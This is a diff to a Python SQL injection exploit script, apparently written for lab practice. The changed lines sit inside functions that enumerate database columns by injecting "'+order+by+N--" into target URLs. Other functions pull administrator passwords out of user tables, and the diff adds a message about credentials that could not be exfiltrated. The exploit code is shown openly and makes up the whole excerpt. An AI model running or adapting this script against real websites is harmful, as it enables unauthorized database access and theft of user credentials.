@@ -160,11 +160,11 @@ def exploit_sqli_users_table(url):
                     admin_password = password_element.contents[0]
                     print(f"[+] User password found for '{username}': '{admin_password}' in table '{table}'")
                     return True
-        print(f"[-] No se encontraron usuarios comunes en la tabla '{table}'. Probando con otra tabla...")
+        #print(f"[-] No se encontraron usuarios comunes en la tabla '{table}'. Probando con otra tabla...")
         #else:
             #print(f"[-] User '{username}' not found in the response.")
        
-    
+    print(f"[-] Administrator credentials could not be exfiltrated")
     return False
 
 def exploit_sqli(url):
@@ -230,7 +230,7 @@ def exploit_sqli_column_number(url):
         - Handles SSL and request-related exceptions.
         - Returns the number of columns or False if an error occurs or if no column number is determined.
     """
-    for i in range(1, 5):
+    for i in range(1, 10):
         target_url = url + "'+order+by+%s--" % i
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
@@ -269,7 +269,7 @@ if __name__ == "__main__":
                 num_col = exploit_sqli_column_number(test_url)
                 if num_col:
                     #print(f"[+] Vulnerable URL found: {test_url}")
-                    print(f"[+] We determined that your database has {num_col} columns at this URL")
+                    print(f"We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                 else:
                     print("[-] URL not vulnerable to sql injection")
             
